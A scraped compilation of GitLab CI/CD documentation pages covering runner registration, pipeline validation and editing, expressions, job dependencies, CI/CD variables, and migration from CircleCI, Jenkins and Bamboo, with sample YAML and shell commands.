# Gitlab - Ci Cd

**Pages:** 20

---

## Registering runners

**URL:** https://docs.gitlab.com/runner/register/

**Contents:**
- Registering runners
- Requirements
- Register with a runner authentication token
- Register with a runner registration token (deprecated)
  - Legacy-compatible registration process
- Register with a configuration template
- Register a runner for GitLab Community Edition integration tests
- Registering runners with Docker
- Troubleshooting
  - Error: Check registration token

Runner registration is the process that links the runner with one or more GitLab instances. You must register the runner so that it can pick up jobs from the GitLab instance.

Before you register a runner:

After you register the runner, the configuration is saved to the config.toml.

To register the runner with a runner authentication token:

Run the register command:

If you are behind a proxy, add an environment variable and then run the registration command:

To register with a container, you can either:

Use a short-lived gitlab-runner container with the correct configuration volume mount:

For local system volume mounts:

If you used a configuration volume other than /srv/gitlab-runner/config during installation, update the command with the correct volume.

For Docker volume mounts:

Use the executable inside an active runner container:

Enter your GitLab URL:

Enter the runner authentication token.

Enter a description for the runner.

Enter the job tags, separated by commas.

Enter an optional maintenance note for the runner.

Enter the type of executor.

You can also use the non-interactive mode to use additional arguments to register the runner:

Runner registration tokens and several runner configuration arguments were deprecated. They are scheduled for removal in GitLab 20.0. Use runner authentication tokens instead. For more information, see Migrating to the new runner registration workflow.

After you register the runner, the configuration is saved to the config.toml.

To register the runner with a runner registration token:

Run the register command:

If you are behind a proxy, add an environment variable and then run the registration command:

To launch a short-lived gitlab-runner container to register the container you created during installation:

For local system volume mounts:

If you used a configuration volume other than /srv/gitlab-runner/config during installation, update the command with the correct volume.

For Docker volume mounts:

Enter your GitLab URL:

Enter the token you obtained to register the runner.

Enter a description for the runner.

Enter the job tags, separated by commas.

Enter an optional maintenance note for the runner.

Enter the type of executor.

To register multiple runners on the same host machine, each with a different configuration, repeat the register command.

You can also use the non-interactive mode to use additional arguments to register the runner:

Runner registration tokens and several runner configuration arguments were deprecated. They are scheduled for removal in GitLab 20.0. To ensure minimal disruption to your automation workflow, the legacy-compatible registration process triggers if a runner authentication token is specified in the legacy parameter --registration-token.

The legacy-compatible registration process ignores the following command-line parameters. These parameters can only be configured when a runner is created in the UI or with the API.

You can use a configuration template to register a runner with settings that are not supported by the register command.

The configuration template can be used for automated environments that do not support some arguments in the register command due to:

The configuration template supports only a single [[runners]] section and does not support global options.

To register a runner:

Create a configuration template file with the .toml format and add your specifications. For example:

Add the path to the file. You can use either:

The non-interactive mode in the command line:

The environment variable in the .gitlab.yaml file:

If you update the environment variable, you do not need to add the file path in the register command each time you register.

After you register the runner, the settings in the configuration template are merged with the [[runners]] entry created in the config.toml:

Template settings are merged only for options that are:

Command-line arguments or environment variables take precedence over settings in the configuration template. For example, if the template specifies a docker executor, but the command line specifies shell, the configured executor is shell.

To test GitLab Community Edition integrations, use a configuration template to register a runner with a confined Docker executor.

Create a project runner.

Create a template with the [[runners.docker.services]] section:

For more configuration options, see Advanced configuration.

After you register the runner with a Docker container:

If gitlab-runner restart runs in a Docker container, GitLab Runner starts a new process instead of restarting the existing process. To apply configuration changes, restart the Docker container instead.

The check registration token error message displays when the GitLab instance does not recognize the runner registration token entered during registration. This issue can occur when either:

When this error occurs, you can ask a GitLab administrator to:

The 410 Gone - runner registration disallowed error message displays when runner registration through registration tokens has been disabled.

When this error occurs, you can ask a GitLab administrator to:

**Examples:**

Example 1 (unknown):
```unknown
sudo gitlab-runner register
```

Example 2 (unknown):
```unknown
export HTTP_PROXY=http://yourproxyurl:3128
export HTTPS_PROXY=http://yourproxyurl:3128

sudo -E gitlab-runner register
```

Example 3 (unknown):
```unknown
gitlab-runner register
```

Example 4 (unknown):
```unknown
.\gitlab-runner.exe register
```

---

## Validate GitLab CI/CD configuration

**URL:** https://docs.gitlab.com/ci/yaml/lint/

**Contents:**
- Validate GitLab CI/CD configuration
- Check CI/CD syntax
- Simulate a pipeline

Use the CI Lint tool to check the validity of GitLab CI/CD configuration. You can validate the syntax from a .gitlab-ci.yml file or any other sample CI/CD configuration. This tool checks for syntax and logic errors, and can simulate pipeline creation to try to find more complicated configuration problems.

If you use the pipeline editor, it verifies configuration syntax automatically.

If you use VS Code, you can validate your CI/CD configuration with the GitLab Workflow extension for VS Code.

The CI lint tool checks the syntax of GitLab CI/CD configuration, including configuration added with the includes keyword.

To check CI/CD configuration with the CI lint tool:

You can simulate the creation of a GitLab CI/CD pipeline to find more complicated issues, including problems with needs and rules configuration. A simulation runs as a Git push event on the default branch.

To simulate a pipeline:

---

## Migrate from CircleCI

**URL:** https://docs.gitlab.com/ci/migration/circleci/

**Contents:**
- Migrate from CircleCI
- config.yml vs .gitlab-ci.yml
  - Jobs
  - Docker image definition
  - Workflows
    - Parallel and sequential job execution
    - Scheduled run
    - Manual run
  - Filter job by branch
  - Caching

If you are currently using CircleCI, you can migrate your CI/CD pipelines to GitLab CI/CD, and start making use of all its powerful features.

We have collected several resources that you may find useful before starting to migrate.

The Quick Start Guide is a good overview of how GitLab CI/CD works. You may also be interested in Auto DevOps which can be used to build, test, and deploy your applications with little to no configuration needed at all.

For advanced CI/CD teams, custom project templates can enable the reuse of pipeline configurations.

If you have questions that are not answered here, the GitLab community forum can be a great resource.

CircleCI’s config.yml configuration file defines scripts, jobs, and workflows (known as “stages” in GitLab). In GitLab, a similar approach is used with a .gitlab-ci.yml file in the root directory of your repository.

In CircleCI, jobs are a collection of steps to perform a specific task. In GitLab, jobs are also a fundamental element in the configuration file. The checkout keyword is not necessary in GitLab CI/CD as the repository is automatically fetched.

CircleCI example job definition:

Example of the same job definition in GitLab CI/CD:

CircleCI defines images at the job level, which is also supported by GitLab CI/CD. Additionally, GitLab CI/CD supports setting this globally to be used by all jobs that don’t have image defined.

CircleCI example image definition:

Example of the same image definition in GitLab CI/CD:

CircleCI determines the run order for jobs with workflows. This is also used to determine concurrent, sequential, scheduled, or manual runs. The equivalent function in GitLab CI/CD is called stages. Jobs on the same stage run in parallel, and only run after previous stages complete. Execution of the next stage is skipped when a job fails by default, but this can be allowed to continue even after a failed job.

See the Pipeline Architecture Overview for guidance on different types of pipelines that you can use. Pipelines can be tailored to meet your needs, such as for a large complex project or a monorepo with independent defined components.

The following examples show how jobs can run in parallel, or sequentially:

CircleCI example with workflows:

Example of the same workflow as stages in GitLab CI/CD:

GitLab CI/CD has an easy to use UI to schedule pipelines. Also, rules can be used to determine if jobs should be included or excluded from a scheduled pipeline.

CircleCI example of a scheduled workflow:

Example of the same scheduled pipeline using rules in GitLab CI/CD:

After the pipeline configuration is saved, you configure the cron schedule in the GitLab UI, and can enable or disable schedules in the UI as well.

CircleCI example of a manual workflow:

Example of the same workflow using when: manual in GitLab CI/CD:

Rules are a mechanism to determine if the job runs for a specific branch.

CircleCI example of a job filtered by branch:

Example of the same workflow using rules in GitLab CI/CD:

GitLab provides a caching mechanism to speed up build times for your jobs by reusing previously downloaded dependencies. It’s important to know the different between cache and artifacts to make the best use of these features.

CircleCI example of a job using a cache:

Example of the same pipeline using cache in GitLab CI/CD:

CircleCI provides Contexts to securely pass environment variables across project pipelines. In GitLab, a Group can be created to assemble related projects together. At the group level, CI/CD variables can be stored outside the individual projects, and securely passed into pipelines across multiple projects.

There are two GitLab issues open addressing CircleCI Orbs and how GitLab can achieve similar functionality.

CircleCI offers executors as the underlying technology to run a specific job. In GitLab, this is done by runners.

The following environments are supported:

Self-managed runners:

GitLab.com instance runners:

Tags can be used to run jobs on different platforms, by telling GitLab which runners should run the jobs.

CircleCI example of a job running on a specific environment:

Example of the same job using tags in GitLab CI/CD:

**Examples:**

Example 1 (unknown):
```unknown
jobs:
  job1:
    steps:
      - checkout
      - run: "execute-script-for-job1"
```

Example 2 (unknown):
```unknown
job1:
  script: "execute-script-for-job1"
```

Example 3 (unknown):
```unknown
jobs:
  job1:
    docker:
      - image: ruby:2.6
```

Example 4 (unknown):
```unknown
job1:
  image: ruby:2.6
```

---

## Migrate from Jenkins

**URL:** https://docs.gitlab.com/ci/migration/jenkins/

**Contents:**
- Migrate from Jenkins
- Key similarities and differences
- Comparison of features and concepts
  - Configuration file
  - Jenkins pipeline syntax
    - Sections
    - Directives
  - Common configurations
    - Jobs
      - Parallel

If you’re migrating from Jenkins to GitLab CI/CD, you are able to create CI/CD pipelines that replicate and enhance your Jenkins workflows.

GitLab CI/CD and Jenkins are CI/CD tools with some similarities. Both GitLab and Jenkins:

Additionally, there are some important differences between the two:

Many Jenkins features and concepts have equivalents in GitLab that offer the same functionality.

Jenkins can be configured with a Jenkinsfile in the Groovy format. GitLab CI/CD uses a .gitlab-ci.yml file by default.

Example of a Jenkinsfile:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

A Jenkins configuration is composed of a pipeline block with sections and directives. GitLab CI/CD has similar functionality, configured with YAML keywords.

This section goes over commonly used CI/CD configurations, showing how they can be converted from Jenkins to GitLab CI/CD.

Jenkins pipelines generate automated CI/CD jobs that are triggered when certain event take place, such as a new commit being pushed. A Jenkins pipeline is defined in a Jenkinsfile. The GitLab equivalent is the .gitlab-ci.yml configuration file.

Jenkins does not provide a place to store source code, so the Jenkinsfile must be stored in a separate source control repository.

Jobs are a set of commands that run in a set sequence to achieve a particular result.

For example, build a container then deploy it to production, in a Jenkinsfile:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In Jenkins, jobs that are not dependent on previous jobs can run in parallel when added to a parallel section.

For example, in a Jenkinsfile:

This example runs a Python and a Java job in parallel, using different container images. The Java job only runs when the staging branch is changed.

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In this case, no extra configuration is needed to make the jobs run in parallel. Jobs run in parallel by default, each on a different runner assuming there are enough runners for all the jobs. The Java job is set to only run when the staging branch is changed.

In GitLab you can use a matrix to run a job multiple times in parallel in a single pipeline, but with different variable values for each instance of the job. Jenkins runs the matrix sequentially.

For example, in a Jenkinsfile:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In GitLab you can run your CI/CD jobs in separate, isolated Docker containers using the image keyword.

For example, in a Jenkinsfile:

This example shows commands running in a python:latest container.

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In GitLab, use the variables keyword to define CI/CD variables. Use variables to reuse configuration data, have more dynamic configuration, or store important values. Variables can be defined either globally or per job.

For example, in a Jenkinsfile:

This example shows how variables can be used to pass values to commands in jobs.

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

Variables can also be set in the GitLab UI, in the CI/CD settings. In some cases, you can use protected and masked variables for secret values. These variables can be accessed in pipeline jobs the same as variables defined in the configuration file.

For example, in a Jenkinsfile:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

Additionally, GitLab CI/CD makes predefined variables available to every pipeline and job which contain values relevant to the pipeline and repository.

When a new pipeline starts, GitLab checks which jobs should run in that pipeline. You can configure jobs to run depending on factors like the status of variables, or the pipeline type.

For example, in a Jenkinsfile:

In this example, the job only runs when the branch we are committing to is named staging.

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

Like Jenkins agents, GitLab runners are the hosts that run jobs. If you are using GitLab.com, you can use the instance runner fleet to run jobs without provisioning your own runners.

To convert a Jenkins agent for use with GitLab CI/CD, uninstall the agent and then install and register a runner. Runners do not require much overhead, so you might be able to use similar provisioning as the Jenkins agents you were using.

Some key details about runners:

For example, in a Jenkinsfile:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In GitLab, any job can use the artifacts keyword to define a set of artifacts to be stored when a job completes. Artifacts are files that can be used in later jobs, for example for testing or deployment.

For example, in a Jenkinsfile:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

A cache is created when a job downloads one or more files and saves them for faster access in the future. Subsequent jobs that use the same cache don’t have to download the files again, so they execute more quickly. The cache is stored on the runner and uploaded to S3 if distributed cache is enabled. Jenkins core does not provide caching.

For example, in a .gitlab-ci.yml file:

Some functionality in Jenkins that is enabled through plugins is supported natively in GitLab with keywords and features that offer similar functionality. For example:

You might have used plugins for things like code quality, security, or static application scanning in Jenkins. GitLab provides security scanners out-of-the-box to detect vulnerabilities in all parts of the SDLC. You can add these plugins in GitLab using templates, for example to add SAST scanning to your pipeline, add the following to your .gitlab-ci.yml:

You can customize the behavior of security scanners by using CI/CD variables, for example with the SAST scanners.

Privileged information, often referred to as “secrets”, is sensitive information or credentials you need in your CI/CD workflow. You might use secrets to unlock protected resources or sensitive information in tools, applications, containers, and cloud-native environments.

Secrets management in Jenkins is usually handled with the Secret type field or the Credentials Plugin. Credentials stored in the Jenkins settings can be exposed to jobs as environment variables by using the Credentials Binding plugin.

For secrets management in GitLab, you can use one of the supported integrations for an external service. These services securely store secrets outside of your GitLab project, though you must have a subscription for the service.

GitLab also supports OIDC authentication for other third party services that support OIDC.

Additionally, you can make credentials available to jobs by storing them in CI/CD variables, though secrets stored in plain text are susceptible to accidental exposure, the same as in Jenkins. You should always store sensitive information in masked and protected variables, which mitigates some of the risk.

Also, never store secrets as variables in your .gitlab-ci.yml file, which is public to all users with access to the project. Storing sensitive information in variables should only be done in the project, group, or instance settings.

Review the security guidelines to improve the safety of your CI/CD variables.

The following list of recommended steps was created after observing organizations that were able to quickly complete this migration.

Before starting a migration you should create a migration plan to make preparations for the migration. For a migration from Jenkins, ask yourself the following questions in preparation:

Before doing any migration work, you should first:

You can use the JenkinsFile Wrapper to run a complete Jenkins instance inside of a GitLab CI/CD job, including plugins. Use this tool to help ease the transition to GitLab CI/CD, by delaying the migration of less urgent pipelines.

The JenkinsFile Wrapper is not packaged with GitLab and falls outside of the scope of support. For more information, see the Statement of Support.

If you have questions that are not answered here, the GitLab community forum can be a great resource.

**Examples:**

Example 1 (unknown):
```unknown
pipeline {
    agent any

    stages {
        stage('hello') {
            steps {
                echo "Hello World"
            }
        }
    }
}
```

Example 2 (unknown):
```unknown
stages:
  - hello

hello-job:
  stage: hello
  script:
    - echo "Hello World"
```

Example 3 (unknown):
```unknown
pipeline {
    agent any
    stages {
        stage('build') {
            agent { docker 'golang:alpine' }
            steps {
                apk update
                go build -o bin/hello
            }
            post {
              always {
                archiveArtifacts artifacts: 'bin/hello'
                onlyIfSuccessful: true
              }
            }
        }
        stage('deploy') {
            agent { docker 'golang:alpine' }
            when {
              branch 'staging'
            }
            steps {
                echo "Deploying to staging"
                scp bin/hello remoteuser@remotehost:/remote/directory
            }
        }
    }
}
```

Example 4 (unknown):
```unknown
default:
  image: golang:alpine

stages:
  - build
  - deploy

build-job:
  stage: build
  script:
    - apk update
    - go build -o bin/hello
  artifacts:
    paths:
      - bin/hello
    expire_in: 1 week

deploy-job:
  stage: deploy
  script:
    - echo "Deploying to Staging"
    - scp bin/hello remoteuser@remotehost:/remote/directory
  rules:
    - if: $CI_COMMIT_BRANCH == 'staging'
  artifacts:
    paths:
      - bin/hello
```

---

## Pipeline editor

**URL:** https://docs.gitlab.com/ci/pipeline_editor/

**Contents:**
- Pipeline editor
- Validate CI/CD syntax
- Validate CI/CD configuration
- View included CI/CD configuration
- Visualize CI configuration
- View full configuration
- Commit changes to CI configuration
- Editor accessibility options
- Troubleshooting
  - Unable to validate CI/CD configuration. message

The pipeline editor is the primary place to edit the GitLab CI/CD configuration in the .gitlab-ci.yml file in the root of your repository. To access the editor, go to Build > Pipeline editor.

From the pipeline editor page you can:

As you use the pipeline editor, the pipeline configuration syntax is continually validated against the GitLab CI/CD pipeline schema. The syntax of your CI/CD YAML and also some basic logical validations are checked.

The result of this validation is shown at the top of the editor page. If the validation fails, this section displays a tip to help you fix the problem.

To test the validity of your GitLab CI/CD configuration before committing the changes, use the pipeline editor validation tool. This tool simulates the creation of pipeline due to a Git push event, and can help troubleshoot logic issues, including incorrect rules and needs job dependencies:

The simulated pipeline uses the existing pipeline configuration from the Edit tab.

To validate a CI/CD YAML snippet without adding it to the Edit tab, use the CI Lint tool instead.

You can review configuration added with the include keyword in the pipeline editor. In the upper-right corner, select the file tree ( file-tree ) to see a list of all included configuration files. Selected files open in a new tab for review.

To view a visualization of your .gitlab-ci.yml configuration, in your project, go to Build > Pipeline editor, and then select the Visualize tab. The visualization shows all stages and jobs. Any needs relationships are displayed as lines connecting jobs together, showing the hierarchy of execution.

Hover over a job to highlight its needs relationships:

If the configuration does not have any needs relationships, then no lines are drawn because each job depends only on the previous stage being completed successfully.

To view the fully expanded CI/CD configuration as one combined file, go to the pipeline editor’s Full configuration tab. This tab displays an expanded configuration where:

Using !reference tags can cause nested configuration that display with multiple hyphens (-) at the start of the line in the expanded view. This behavior is expected, and the extra hyphens do not affect the job’s execution. For example, this configuration and fully expanded version are both valid:

Expanded configuration in Full configuration tab:

The commit form appears at the bottom of each tab in the editor so you can commit your changes at any time.

When you are satisfied with your changes, add a descriptive commit message and enter a branch. The branch field defaults to your project’s default branch.

If you enter a new branch name, the Start a new merge request with these changes checkbox appears. Select it to start a new merge request after you commit the changes.

The pipeline editor is based on the Monaco Editor which has several accessibility features, including:

This message is caused by a problem validating the syntax in the pipeline editor. It can happen when GitLab is unable to communicate with the service that validates the syntax.

The information in these sections may not display properly:

You can still work on your CI/CD configuration and commit the changes you made without any issues. As soon as the service becomes available again, the syntax validation should display immediately.

**Examples:**

Example 1 (unknown):
```unknown
.python-req:
  script:
    - pip install pyflakes

.rule-01:
  rules:
    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/
      when: manual
      allow_failure: true
    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME

.rule-02:
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: manual
      allow_failure: true

lint-python:
  image: python:latest
  script:
    - !reference [.python-req, script]
    - pyflakes python/
  rules:
    - !reference [.rule-01, rules]
    - !reference [.rule-02, rules]
```

Example 2 (unknown):
```unknown
".python-req":
  script:
  - pip install pyflakes
".rule-01":
  rules:
  - if: "$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/"
    when: manual
    allow_failure: true
  - if: "$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME"
".rule-02":
  rules:
  - if: $CI_COMMIT_BRANCH == "main"
    when: manual
    allow_failure: true
lint-python:
  image: python:latest
  script:
  - - pip install pyflakes                                     # <- The extra hyphens do not affect the job's execution.
  - pyflakes python/
  rules:
  - - if: "$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/" # <- The extra hyphens do not affect the job's execution.
      when: manual
      allow_failure: true
    - if: "$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME"               # <- No extra hyphen but aligned with previous rule
  - - if: $CI_COMMIT_BRANCH == "main"                          # <- The extra hyphens do not affect the job's execution.
      when: manual
      allow_failure: true
```

---

## CI/CD expressions

**URL:** https://docs.gitlab.com/ci/yaml/expressions/

**Contents:**
- CI/CD expressions
- Configuration expressions
  - Inputs context
  - Matrix context
- Related topics

CI/CD expressions enable dynamic configuration in your CI/CD pipelines by referencing variables and inputs in specialized contexts. GitLab evaluates expressions in the pipeline configuration before the pipeline is created.

Configuration expressions use the $[[ ]] syntax and are evaluated at pipeline creation time (compile-time). They enable dynamic configuration based on different contexts.

All configuration expressions share these characteristics:

Configuration expressions support different contexts for accessing values:

Use the inputs. context to reference CI/CD inputs in reusable configurations using $[[ inputs.INPUT_NAME ]] syntax.

input. expressions have the following characteristics:

Use the matrix. context to reference parallel:matrix values by using a $[[ matrix.IDENTIFIER ]] syntax. Use it in job dependencies to enable dynamic 1:1 mappings between parallel:matrix jobs.

matrix. expressions have the following characteristics:

**Examples:**

Example 1 (unknown):
```unknown
spec:
  inputs:
    environment:
      default: production
    job-stage:
      default: test
---
scan-website:
  stage: $[[ inputs.job-stage ]]
  script: ./scan-website $[[ inputs.environment ]]
```

Example 2 (unknown):
```unknown
.os-arch-matrix:
  parallel:
    matrix:
      - OS: [ubuntu, alpine]
        ARCH: [amd64, arm64]

build:
  script: echo "Testing $OS on $ARCH"
  parallel: !reference [.os-arch-matrix, parallel]

test:
  script: echo "Testing $OS on $ARCH"
  parallel: !reference [.os-arch-matrix, parallel]
  needs:
    - job: build
      parallel:
        matrix:
          - OS: ['$[[ matrix.OS ]]']
            ARCH: ['$[[ matrix.ARCH ]]']
```

---

## Migrate from Bamboo

**URL:** https://docs.gitlab.com/ci/migration/bamboo/

**Contents:**
- Migrate from Bamboo
- Key migration considerations
- Configuration examples
  - Bamboo Specs export
  - Jobs and tasks
  - Container images
  - Variables
  - Conditions and triggers
  - Artifacts
  - Caching

You can migrate from Atlassian Bamboo to GitLab CI/CD by converting Bamboo Specs YAML configurations exported from the Bamboo UI or stored in Spec repositories.

The following examples show a Bamboo Specs YAML export from the UI and its GitLab CI/CD equivalent.

Bamboo organizes builds through a nested hierarchy where projects contain multiple plans, plans define stages and jobs, and jobs execute individual tasks. Projects serve as containers for shared resources like variables, credentials, and repository connections that multiple plans can access.

Bamboo Specs exports from the UI include this complete hierarchy plus administrative metadata like permissions, notifications, and project settings.

When reviewing your export, focus on these migration-critical elements:

GitLab CI/CD eliminates the nested complexity. Instead each repository contains a single .gitlab-ci.yml file that defines all stages and jobs.

In both GitLab and Bamboo, jobs in the same stage run in parallel, except where there is a dependency that needs to be met before a job runs.

The number of jobs that can run in Bamboo depends on availability of Bamboo agents and Bamboo license size.

With GitLab CI/CD, the number of parallel jobs depends on the number of runners integrated with the GitLab instance and the concurrency set in the runners.

In Bamboo, jobs are composed of tasks, which can be a set of commands run as a script or predefined tasks like source code checkout, artifact download, and other tasks available in the Atlassian tasks marketplace.

The equivalent of tasks in GitLab is the script, which specifies the commands for the runner to execute. You can use CI/CD templates and CI/CD components to compose your pipelines without the need to write everything yourself.

The following examples show how the Bamboo docker keyword translates to the GitLab image keyword.

Builds and deployments run by default on the Bamboo agent’s native operating system, but can be configured to run in containers using the docker keyword.

In GitLab CI/CD, you only need the image keyword.

The following examples show the syntax differences for defining and accessing variables.

Bamboo has different variable types with different access patterns. System variables use ${system.variableName} and other variables use ${bamboo.variableName}.

In script tasks, dots are converted to underscores. For example, ${bamboo.variableName} becomes $bamboo_variableName.

In GitLab CI/CD, variables are accessed like regular Shell script variables using $VARIABLE_NAME. Like system and global variables in Bamboo, GitLab has predefined CI/CD variables that are available to every job.

These examples show how Bamboo conditions and triggers convert to GitLab rules.

Bamboo has various options for triggering builds, which can be based on code changes, a schedule, the outcomes of other plans, or on demand. A plan can be configured to periodically poll a project for new changes.

GitLab CI/CD pipelines are triggered based on code changes, schedules, or API calls. Pipelines do not use polling.

You can define job artifacts using the artifacts keyword in both GitLab and Bamboo.

In Bamboo, artifacts are defined with a name, location, and pattern. You can share the artifacts with other jobs and plans or define jobs that subscribe to the artifact.

artifact-subscriptions is used to access artifacts from another job in the same plan, and artifact-download is used to access artifacts from jobs in a different plan.

In GitLab, all artifacts from completed jobs in earlier stages are downloaded by default.

In Bamboo, Git caches can be used to speed up builds. Git caches are configured in Bamboo administration settings and are stored either on the Bamboo server or remote agents.

GitLab supports both Git caches and job cache. Caches are defined for each job using the cache keyword:

The following examples show how to convert Bamboo deployment projects to GitLab deployment jobs.

Bamboo has deployment projects, which link to build plans to track, fetch, and deploy artifacts to deployment environments. When creating a project you link it to a build plan, specify the deployment environment and the tasks to perform the deployments.

In GitLab CI/CD, you can create a deployment job that deploys to an environment or creates a release.

To create a release instead, use the release keyword with the glab CLI tool to create releases for Git tags:

Bamboo relies on third-party tasks provided in the Atlassian Marketplace to run security scans.

GitLab provides security scanners to detect vulnerabilities in all parts of the SDLC. You can add these scanners in GitLab using templates, for example to add SAST scanning to your pipeline:

You can customize the behavior of security scanners by using CI/CD variables.

Secrets management in Bamboo is handled using shared credentials, or with third-party applications from the Atlassian marketplace.

For secrets management in GitLab, you can use supported integrations for external services. These services securely store secrets outside of your GitLab project, though you must have a subscription for the service.

GitLab also supports OIDC authentication for other third-party services that support OIDC.

Additionally, you can make credentials available to jobs by storing them in CI/CD variables, though secrets stored in plain text are susceptible to accidental exposure. You should always store sensitive information in masked and protected variables, which mitigates some of the risk.

Never store secrets as variables in your .gitlab-ci.yml file, which is public to all users with access to the project. Storing sensitive information in variables should only be done in the project, group, or instance settings.

Before starting your migration, create a migration plan and answer these questions:

To migrate from Bamboo:

Audit your Bamboo configuration:

Migrate your source code repositories to GitLab:

Set up GitLab runners with equivalent software:

Convert Bamboo Specs to .gitlab-ci.yml files:

Migrate artifact handling:

Convert Bamboo deployment projects:

Migrate secrets and credentials:

Test and optimize your migrated pipelines:

**Examples:**

Example 1 (unknown):
```unknown
version: 2
plan:
  project-key: AB
  key: TP
  name: test plan
stages:
  - Default Stage:
      manual: false
      final: false
      jobs:
        - Default Job
Default Job:
  key: JOB1
  tasks:
  - checkout:
      force-clean-build: false
      description: Checkout Default Repository
  - script:
      interpreter: SHELL
      scripts:
        - |-
          ruby -v  # Print out ruby version for debugging
          bundle config set --local deployment true  # Install dependencies into ./vendor/ruby
          bundle install -j $(nproc)
          rubocop
          rspec spec
      description: run bundler
  artifact-subscriptions: []
repositories:
  - Demo Project:
      scope: global
triggers:
  - polling:
      period: '180'
branches:
  create: manually
  delete: never
  link-to-jira: true
notifications: []
labels: []
dependencies:
  require-all-stages-passing: false
  enabled-for-branches: true
  block-strategy: none
  plans: []
other:
  concurrent-build-plugin: system-default

---

version: 2
plan:
  key: AB-TP
plan-permissions:
  - users:
    - root
    permissions:
    - view
    - edit
    - build
    - clone
    - admin
    - view-configuration
  - roles:
    - logged-in
    - anonymous
    permissions:
    - view
...
```

Example 2 (unknown):
```unknown
default:
  image: ruby:latest

stages:
  - default-stage

job1:
  stage: default-stage
  script:
    - ruby -v  # Print out ruby version for debugging
    - bundle config set --local deployment true  # Install dependencies into ./vendor/ruby
    - bundle install -j $(nproc)
    - rubocop
    - rspec spec
```

Example 3 (unknown):
```unknown
version: 2
#...

Default Job:
  key: JOB1
  tasks:
  - checkout:
      force-clean-build: false
      description: Checkout Default Repository
  - script:
      interpreter: SHELL
      scripts:
        - |-
          ruby -v
          bundle config set --local deployment true
          bundle install -j $(nproc)
      description: run bundler
other:
  concurrent-build-plugin: system-default
```

Example 4 (unknown):
```unknown
job1:
  script: "bundle exec rspec"

job2:
  script:
    - ruby -v
    - bundle config set --local deployment true
    - bundle install -j $(nproc)
```

---

## Make jobs start earlier with needs

**URL:** https://docs.gitlab.com/ci/yaml/needs/

**Contents:**
- Make jobs start earlier with needs
- Use cases

You can use the needs keyword to create dependencies between jobs in a pipeline. Jobs run as soon as their dependencies are met, regardless of the pipeline’s stages configuration. You can even configure a pipeline with no stages defined (effectively one large stage) and jobs still run in the proper order. This pipeline structure is a kind of directed acyclic graph.

For example, you may have a specific tool or separate website that is built as part of your main project. Using needs, you can specify dependencies between these jobs and GitLab executes the jobs as soon as possible instead of waiting for each stage to complete.

Unlike other solutions for CI/CD, GitLab does not require you to choose between staged or stageless execution flow. You can implement a hybrid combination of staged and stageless in a single pipeline, using only the needs keyword to enable the feature for any job.

Consider a monorepo as follows:

This project could have a pipeline organized into three stages:

You can improve job execution by using needs to relate the a jobs to each other separately from the b, c, and d jobs. build_a could take a very long time to build, but test_b doesn’t need to wait, it can be configured to start as soon as build_b is finished, which could be much faster.

If desired, c and d jobs can be left to run in stage sequence.

The needs keyword also works with the parallel keyword, giving you powerful options for parallelization in your pipeline.

You can use the needs keyword to define several different kinds of dependencies between jobs in a CI/CD pipeline. You can set dependencies to fan in or out, and even merge back together (diamond dependencies). These dependencies could be used for pipelines that:

Additionally, needs can help improve the overall speed of pipelines and provide fast feedback. By creating dependencies that don’t unnecessarily block each other, your pipelines run as quickly as possible regardless of pipeline stages, ensuring output (including errors) is available to developers as quickly as possible.

**Examples:**

Example 1 (unknown):
```unknown
./service_a
./service_b
./service_c
./service_d
```

---

## Predefined CI/CD variables reference

**URL:** https://docs.gitlab.com/ci/variables/predefined_variables/

**Contents:**
- Predefined CI/CD variables reference
- Variable availability
- Predefined variables
- Predefined variables for merge request pipelines
- Predefined variables for external pull request pipelines
- Deployment variables
- Auto DevOps variables
- Integration variables
- Troubleshooting

Predefined CI/CD variables are available in every GitLab CI/CD pipeline.

Avoid overriding predefined variables, as it can cause the pipeline to behave unexpectedly.

Predefined variables become available at three different phases of pipeline execution:

These variables are available before GitLab creates the pipeline (Pre-pipeline). These variables can be used with include:rules and as environment variables in jobs.

The pipeline must be a merge request pipeline, and the merge request must be open.

These variables are only available when:

Integrations that are responsible for deployment configuration can define their own predefined variables that are set in the build environment. These variables are only defined for deployment jobs.

For example, the Kubernetes integration defines deployment variables that you can use with the integration.

The documentation for each integration explains if the integration has any deployment variables available.

When Auto DevOps is enabled, some additional pre-pipeline variables are made available:

Some integrations make variables available in jobs. These variables are available as job-only predefined variables:

You can output the values of all variables available for a job with a script command.

---

## GitLab CI/CD variables

**URL:** https://docs.gitlab.com/ci/variables/

**Contents:**
- GitLab CI/CD variables
- Predefined CI/CD variables
- Define a CI/CD variable in the .gitlab-ci.yml file
  - Skip default variables in a single job
- Define a CI/CD variable in the UI
  - For a project
  - For a group
    - Environment scope
  - For an instance
- CI/CD variable security

CI/CD variables are a type of environment variable. You can use them to:

Variable names are limited by the shell the runner uses to execute scripts. Each shell has its own set of reserved variable names.

To ensure consistent behavior, you should always put variable values in single or double quotes. Variables are internally parsed by the Psych YAML parser, so quoted and unquoted variables might be parsed differently. For example, VAR1: 012345 is interpreted as an octal value, so the value becomes 5349, but VAR1: "012345" is parsed as a string with a value of 012345.

For more information about advanced use of GitLab CI/CD, see 7 advanced GitLab CI workflow hacks shared by GitLab engineers.

GitLab CI/CD makes a set of predefined CI/CD variables available for use in pipeline configuration and job scripts. These variables contain information about the job, pipeline, and other values you might need when the pipeline is triggered or running.

You can use predefined CI/CD variables in your .gitlab-ci.yml without declaring them first. For example:

The script in this example outputs The job's stage is 'test'.

To create a CI/CD variable in the .gitlab-ci.yml file, define the variable and value with the variables keyword.

